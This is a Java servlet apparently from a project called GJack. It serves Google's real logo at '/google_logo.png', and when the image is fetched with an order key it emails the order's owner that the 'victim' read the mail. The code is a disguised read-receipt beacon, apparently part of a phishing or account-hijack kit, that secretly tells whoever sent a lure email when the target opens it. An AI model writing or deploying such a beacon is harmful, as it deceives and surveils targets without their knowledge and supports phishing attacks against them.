package com.theah64.gjack.servlets;

import com.theah64.gjack.database.Orders;
import com.theah64.gjack.model.Order;
import com.theah64.webengine.exceptions.MailException;
import com.theah64.webengine.utils.MailHelper;

import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;

/**
 * Created by theapache64 on 31/10/17.
 */
@WebServlet(urlPatterns = "/google_logo.png")
public class GoogleLogoServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        resp.setContentType("image/png");

        System.out.println(System.getProperty("catalina.home"));

        //Getting order key
        final String key = req.getParameter(Orders.COLUMN_KEY);
        if (key != null && !key.isEmpty()) {

            final Order order = Orders.getInstance().get(Orders.COLUMN_KEY, key);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        MailHelper.sendMail(order.getUserEmail(), "GJack Open receipt", order.getVictimEmail() + " read the mail", "GJack");
                    } catch (MailException e) {
                        e.printStackTrace();
                    }
                }
            }).start();

        }


        ServletOutputStream out;
        out = resp.getOutputStream();
        final URL url = new URL("https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_tm_black54_color_96x40dp.png");
        InputStream fin = url.openStream();

        BufferedInputStream bin = new BufferedInputStream(fin);
        BufferedOutputStream bout = new BufferedOutputStream(out);
        int ch = 0;
        ;
        while ((ch = bin.read()) != -1) {
            bout.write(ch);
        }

        bin.close();
        fin.close();
        bout.close();
        out.close();

    }


    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doGet(req, resp);
    }
}
